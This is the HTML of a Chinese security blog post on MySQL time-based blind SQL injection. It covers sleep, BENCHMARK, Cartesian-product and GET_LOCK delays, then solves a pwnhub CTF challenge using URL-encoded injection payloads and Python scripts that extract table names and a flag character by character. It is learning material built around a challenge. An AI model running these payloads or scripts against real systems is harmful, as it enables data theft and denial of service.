@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>时间盲注学习 | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="web" />
+  
+  
+  
+  
+  <meta name="description" content="0x00 前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&amp;gt;。">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="时间盲注学习">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;04&#x2F;07&#x2F;%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="0x00 前言完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&amp;gt;。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-27T04:54:44.656Z">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-时间盲注学习" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      时间盲注学习
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/04/07/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%AD%A6%E4%B9%A0/" class="article-date">
+	  <time datetime="2018-04-07T14:36:37.000Z" itemprop="datePublished">April 7, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>完整的学习四种时间注入的方式，分别是sleep(),benchmark(),笛卡尔积,get_lock&gt;。</p>
+<a id="more"></a>
+<h2 id="0x01-sleep"><a href="#0x01-sleep" class="headerlink" title="0x01 sleep()"></a>0x01 sleep()</h2><p>最常见的时间注入方式，sleep(n)让语句运行n秒中。<br>配合if语句 …if(1,sleep(3),0)…<br>或者select case when 语句。不做深入研究。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(3);</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">| sleep(3) |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">|        0 |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">1 row in set (3.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-BENCHMARK"><a href="#0x02-BENCHMARK" class="headerlink" title="0x02 BENCHMARK()"></a>0x02 BENCHMARK()</h2><p>BENCHMARK函数执行某函数的次数<br>BENCHMARK(n,SHA1(‘asd’))<br>n=次数，代表执行SHA1(‘asd’)n次，当n到达一定程度时会造成和sleep()一样的效果</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select BENCHMARK(10000000,SHA1(<span class="emphasis">'1'</span>));</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">| BENCHMARK(1000000,SHA1(<span class="emphasis">'1'</span>)) |</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">|                             0 |</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">1 row in set (0.24 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select BENCHMARK(10000000,SHA1(<span class="emphasis">'1'</span>));</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">| BENCHMARK(10000000,SHA1(<span class="emphasis">'1'</span>)) |</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">|                             0 |</span><br><span class="line"><span class="code">+-------------------------------+</span></span><br><span class="line">1 row in set (2.44 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-笛卡尔积"><a href="#0x03-笛卡尔积" class="headerlink" title="0x03 笛卡尔积"></a>0x03 笛卡尔积</h2><p>通过对一张表作自身的笛卡尔积让查询时间变长从而达到和sleep一样的效果<br>这里用information_schema.columns表做笛卡儿积</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(<span class="strong">*) from information_schema.columns; //</span></span><br><span class="line"><span class="strong">+----------+</span></span><br><span class="line"><span class="strong">| count(*</span>) |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">|     3095 |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(<span class="strong">*) from information_schema.columns ,information_schema.columns qwe;</span></span><br><span class="line"><span class="strong">+----------+</span></span><br><span class="line"><span class="strong">| count(*</span>) |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">|  9579025 |</span><br><span class="line"><span class="code">+----------+</span></span><br><span class="line">1 row in set (0.38 sec)</span><br></pre></td></tr></table></figure>
+<p>可以看到做一次笛卡儿积后时间翻了很多倍。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> count(*) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> ,information_schema.<span class="keyword">columns</span> qwe ,information_schema.<span class="keyword">columns</span> wer;</span><br></pre></td></tr></table></figure>
+<p>两次笛卡儿积可以直接把数据库打挂。</p>
+<h2 id="0x04-get-lock"><a href="#0x04-get-lock" class="headerlink" title="0x04 get_lock"></a>0x04 get_lock</h2><p>GET_LOCK(str,timeout);<br>先锁定一个变量 : GET_LOCK(‘altman’,1)<br>再使用另一个session执行函数 : GET_LOCK(‘altman’,5)<br>会产生一个5秒的停滞。<br>本地测试一下。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select GET<span class="emphasis">_LOCK('qwe',1);</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| GET_</span>LOCK(<span class="emphasis">'qwe'</span>,1) |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">|                 1 |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">//再打开另一个MYSQL命令行</span></span><br><span class="line"></span><br><span class="line">mysql&gt;  select get<span class="emphasis">_lock('qwe',5);</span></span><br><span class="line"><span class="emphasis">+-------------------+</span></span><br><span class="line"><span class="emphasis">| get_</span>lock(<span class="emphasis">'qwe'</span>,5) |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">|                 0 |</span><br><span class="line"><span class="code">+-------------------+</span></span><br><span class="line">1 row in set (5.00 sec)</span><br></pre></td></tr></table></figure>
+<p>造成的与sleep(5)相同的效果</p>
+<h2 id="0x05实战"><a href="#0x05实战" class="headerlink" title="0x05实战"></a>0x05实战</h2><p>pwnhub上的sql题。给出了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'conn.php'</span>;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/(sleep|benchmark|outfile|dumpfile|load_file|join)/i"</span>, $_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"you bad bad!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select * from article where id='"</span>.intval($id).<span class="string">"'"</span>;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"404 not found!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($res, MYSQL_ASSOC);</span><br><span class="line">mysql_query(<span class="string">"update view set view_times=view_times+1 where id = '"</span>.$id.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注入点很明显的时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query("<span class="keyword">update</span> <span class="keyword">view</span> <span class="keyword">set</span> view_times=view_times+<span class="number">1</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'".$id." '</span><span class="string">");</span></span><br></pre></td></tr></table></figure>
+
+<p>但是sleep,BENCHMARK被正则了 这里分别用 笛卡儿积，get_lock三种方法尝试。</p>
+<h3 id="笛卡儿积"><a href="#笛卡儿积" class="headerlink" title="笛卡儿积"></a>笛卡儿积</h3><p>先尝试payload:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">27</span><span class="keyword">or</span>%<span class="number">20</span>(select%<span class="number">20</span><span class="keyword">if</span>(<span class="number">1</span>,(select%<span class="number">20</span>count(*)%<span class="number">20f</span>rom%<span class="number">20</span>information_schema.columns,%<span class="number">20</span>information_schema.columns%<span class="number">20</span>T1,%<span class="number">20</span>information_schema.columns%<span class="number">20</span>T2,%<span class="number">20</span>information_schema.columns%<span class="number">20</span>T3),<span class="number">0</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>成功造成停滞 ok ！<br>接下来写python脚本 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">'http://219.219.61.234:20262/article.php?id='</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.letters+<span class="string">'123456789'</span>+<span class="string">'&#123;&#125;!@#$%^&amp;*()_'</span>:</span><br><span class="line">        url1 = url + <span class="string">"' or  (select if(((select ascii(substr(group_concat(table_name),"</span> + str(i) + <span class="string">",1)) from information_schema.tables where table_schema=database() )='"</span> + str(ord(str(j))) + <span class="string">"'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23"</span></span><br><span class="line">        <span class="comment">#url1 = url + "' or  (select if(((select ascii(substr(group_concat(column_name)," + str(i) + ",1)) from information_schema.columns where table_schema=database() and table_name='flag')='" + str(ord(str(j))) + "'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23"</span></span><br><span class="line">        <span class="comment">#url1 = url + "' or (select if(((select ascii(substr(flag," + str(i) + ",1)) from flag)='" + str(ord(str(j))) + "'),(select count(*) from information_schema.columns, information_schema.columns a, information_schema.columns b, information_schema.columns c),1))%23"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url1, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += str(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h3><p>先注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">27</span>%<span class="number">20</span><span class="keyword">or</span>%<span class="number">20</span>get_lock(%<span class="number">27</span>altman%<span class="number">27</span>,<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>然后更换IP访问或者等一会之后访问从而使得MYSQL的session改变</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=%<span class="number">27</span>%<span class="number">20</span><span class="keyword">or</span>%<span class="number">20</span>get_lock(%<span class="number">27</span>altman%<span class="number">27</span>,<span class="number">5</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<p>成功造成5s延迟。<br>接下来运行python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">'http://219.219.61.234:20262/article.php?id='</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.letters+<span class="string">'123456789'</span>+<span class="string">'&#123;&#125;!@#$%^&amp;*()_'</span>:</span><br><span class="line">        url1 = url + <span class="string">"' or (select if(((select ascii(substr(flag,"</span> + str(i) + <span class="string">",1)) from flag)='"</span> + str(ord(str(j))) + <span class="string">"'),(get_lock('altman',7)),1))%23"</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url1, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += str(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/01/redhat2018-writeup/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          redhat2018-writeup
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/03/08/%E5%AE%9E%E9%AA%8C%E5%90%A7%E5%87%A0%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">实验吧几道注入题</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-sleep"><span class="nav-number">2.</span> <span class="nav-text">0x01 sleep()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-BENCHMARK"><span class="nav-number">3.</span> <span class="nav-text">0x02 BENCHMARK()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-笛卡尔积"><span class="nav-number">4.</span> <span class="nav-text">0x03 笛卡尔积</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-get-lock"><span class="nav-number">5.</span> <span class="nav-text">0x04 get_lock</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05实战"><span class="nav-number">6.</span> <span class="nav-text">0x05实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#笛卡儿积"><span class="nav-number">6.1.</span> <span class="nav-text">笛卡儿积</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-lock"><span class="nav-number">6.2.</span> <span class="nav-text">get_lock</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
